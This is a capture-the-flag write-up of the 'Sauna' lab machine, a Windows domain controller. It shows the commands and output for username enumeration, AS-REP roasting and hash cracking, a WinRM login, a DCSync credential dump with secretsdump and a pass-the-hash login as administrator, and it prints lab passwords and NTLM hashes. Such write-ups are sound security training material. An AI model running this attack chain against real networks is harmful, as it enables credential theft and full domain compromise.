# Sauna

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sV -sC -T4 10.10.10.175   
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 14:40 EST
Nmap scan report for 10.10.10.175
Host is up (0.067s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-01 02:40:34Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m01s
| smb2-time: 
|   date: 2025-12-01T02:40:43
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

We find a website with a "Meet the team section". We get names of employees. We should try to make a userlist and see if any exist

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FBQK6EUiuZAepnWa2Lcci%2Fimage.png?alt=media&#x26;token=7a9df760-b97e-4a2d-8bc8-80ec6f7dbbc1" alt=""><figcaption></figcaption></figure>

From the names, generate potential users then use kerbrute to enumerate which exist

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 users.py names > potential_users 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ kerbrute userenum -d egotistical-bank.local potential_users --dc 10.10.10.175

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 11/30/25 - Ronnie Flathers @ropnop

2025/11/30 14:52:59 >  Using KDC(s):
2025/11/30 14:52:59 >   10.10.10.175:88

2025/11/30 14:52:59 >  [+] fsmith has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$fsmith@EGOTISTICAL-BANK.LOCAL:4b479db97306014c5342e4d8a3b98fe5$f71199df2d363bf9ffd5b5ed7ad4eb48fc39986ea7f05bc032bdb039ae6be80f5b913c83ce6c44b5d734ccd3b4e593a775ac9a33b1299d734732a8b9219258d5c4b36bb972cac59d2c320c19215cbb48cdfd904ad45e135e1c05557c632fe6606b08e64f1440ebf29f6c033c27d2374a88d2f27e19e73c106c9d8e0ee258d514707bdfb7e2808b58b81953d6ebf1f685601450fe2ef1b87d3850f1bc3003ee6e8cead7baaffc589a08611e46535535a66e5caca68e0a236846ca1debb3396cf6a6ac004d6c083a228cb0e3325f93f6cbc8fb6219bded432bee603d6c1cca0a99c50c642b698c0081f0c8fe158bcfb52271eb8046d997d1169db46d46d64a07758733a41a46527fb16d85abf930ea5e3ad169b6b43f74                                                                           
2025/11/30 14:52:59 >  [+] VALID USERNAME:       fsmith@egotistical-bank.local
```

We have a fsmith user, which is AS-REP Roastable

We need to use the impacket GetNPUser to get the correct hash format

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ GetNPUsers.py -dc-ip 10.10.10.175 -no-pass egotistical-bank.local/fsmith
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for fsmith
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:3ec5e96a3d4a4fff96d7ede8841f3f14$657ff3aa2b2fb64955d8929ca7d657bcf0c154ba333842becdc020f6b3c5ff311e956e14aa78bfff66e4ac2c8370013e6418fffff67e9eb9a33d58845fff95886414eed2bfeccc9a8571dcf886f822e638c9d7d7b5ead26bee88a5c5229bf0d017ecbd2345cacf7f91be8ef0183b375cc54dfbbbbf53288668d1c27782bcd75b07484efd94e764a0cd4951e514779218208b9bc83aa29b10236496fca6ebc6225a53b800055d747684a7cdf36c9c530df642cd8ca489d3967661246110105ec10b86461fe610c0643339ed37fc60e199490cc51601bf3966dd805db1889da0893ba9faf5a542215f1f204993924457d18839ad7b77d17bb63bb8d9b74768ba4c
```

Next we crack the hash

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ hashcat -m 18200 '$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:3ec5e96a3d4a4fff96d7ede8841f3f14$657ff3aa2b2fb64955d8929ca7d657bcf0c154ba333842becdc020f6b3c5ff311e956e14aa78bfff66e4ac2c8370013e6418fffff67e9eb9a33d58845fff95886414eed2bfeccc9a8571dcf886f822e638c9d7d7b5ead26bee88a5c5229bf0d017ecbd2345cacf7f91be8ef0183b375cc54dfbbbbf53288668d1c27782bcd75b07484efd94e764a0cd4951e514779218208b9bc83aa29b10236496fca6ebc6225a53b800055d747684a7cdf36c9c530df642cd8ca489d3967661246110105ec10b86461fe610c0643339ed37fc60e199490cc51601bf3966dd805db1889da0893ba9faf5a542215f1f204993924457d18839ad7b77d17bb63bb8d9b74768ba4c' /usr/share/wordlists/rockyou.txt
```

fsmith:Thestrokes23

We validate the creds and enumerate the shares

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc smb sauna.egotistical-bank.local -u fsmith -p 'Thestrokes23' --shares 
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
SMB         10.10.10.175    445    SAUNA            [*] Enumerated shares
SMB         10.10.10.175    445    SAUNA            Share           Permissions     Remark
SMB         10.10.10.175    445    SAUNA            -----           -----------     ------
SMB         10.10.10.175    445    SAUNA            ADMIN$                          Remote Admin
SMB         10.10.10.175    445    SAUNA            C$                              Default share
SMB         10.10.10.175    445    SAUNA            IPC$            READ            Remote IPC
SMB         10.10.10.175    445    SAUNA            NETLOGON        READ            Logon server share 
SMB         10.10.10.175    445    SAUNA            print$          READ            Printer Drivers
SMB         10.10.10.175    445    SAUNA            RICOH Aficio SP 8300DN PCL 6 WRITE           We cant print money
SMB         10.10.10.175    445    SAUNA            SYSVOL          READ            Logon server share
```

We also run bloodhound

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nxc ldap sauna.egotistical-bank.local -u fsmith -p 'Thestrokes23' --bloodhound --collection all --dns-server 10.10.10.175
LDAP        10.10.10.175    389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:None) (channel binding:No TLS cert) 
LDAP        10.10.10.175    389    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
LDAP        10.10.10.175    389    SAUNA            Resolved collection methods: rdp, dcom, group, trusts, objectprops, session, container, acl, psremote, localadmin
LDAP        10.10.10.175    389    SAUNA            Done in 0M 13S
LDAP        10.10.10.175    389    SAUNA            Compressing output into /home/kali/.nxc/logs/SAUNA_10.10.10.175_2025-11-30_145939_bloodhound.zip
```

fsmith is part of the remote management group, so we can login with winrm

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ evil-winrm -i 10.10.10.175 -u fsmith -p 'Thestrokes23'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents>
```

Running winpeas, we find some autologon credentials

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FHw11CMEvKA7ICZHzlFXe%2Fimage.png?alt=media&#x26;token=8ffae754-ff51-4bee-91fe-f94b6ccf2106" alt=""><figcaption></figcaption></figure>

We enumerate users

```shellscript
┌──(kali㉿kali)-[/opt/windows]
└─$ nxc smb sauna.egotistical-bank.local -u 'fsmith' -p 'Thestrokes23' --users                
SMB         10.10.10.175    445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
SMB         10.10.10.175    445    SAUNA            -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.10.175    445    SAUNA            Administrator                 2021-07-26 16:16:16 0       Built-in account for administering the computer/domain 
SMB         10.10.10.175    445    SAUNA            Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.10.10.175    445    SAUNA            krbtgt                        2020-01-23 05:45:30 0       Key Distribution Center Service Account 
SMB         10.10.10.175    445    SAUNA            HSmith                        2020-01-23 05:54:34 0        
SMB         10.10.10.175    445    SAUNA            FSmith                        2020-01-23 16:45:19 0        
SMB         10.10.10.175    445    SAUNA            svc_loanmgr                   2020-01-24 23:48:31 0        
SMB         10.10.10.175    445    SAUNA            [*] Enumerated 6 local users: EGOTISTICALBANK
```

The creds work with svc\_loanmgr, which can DCSync

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FWlFYxYzvUxD6AAGG961X%2Fimage.png?alt=media&#x26;token=2dd04c38-7660-4ae5-9a99-d734f4042855" alt=""><figcaption></figcaption></figure>

```shellscript
┌──(kali㉿kali)-[/opt/windows]
└─$ secretsdump.py -just-dc-ntlm 'EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175' 
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:512a3ae660a0d38814683caa0bbaba00:::
[*] Cleaning up...
```

We can now login as the admin with his NT hash

```shellscript
┌──(kali㉿kali)-[/opt/windows]
└─$ psexec.py administrator@10.10.10.175 -hashes :823452073d75b9d1cf70ebdf86c7f98e
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.175.....
[*] Found writable share ADMIN$
[*] Uploading file xZblyKqq.exe
[*] Opening SVCManager on 10.10.10.175.....
[*] Creating service crev on 10.10.10.175.....
[*] Starting service crev.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
5ef3c1fa8368e6fe3fa12121552d669a
```
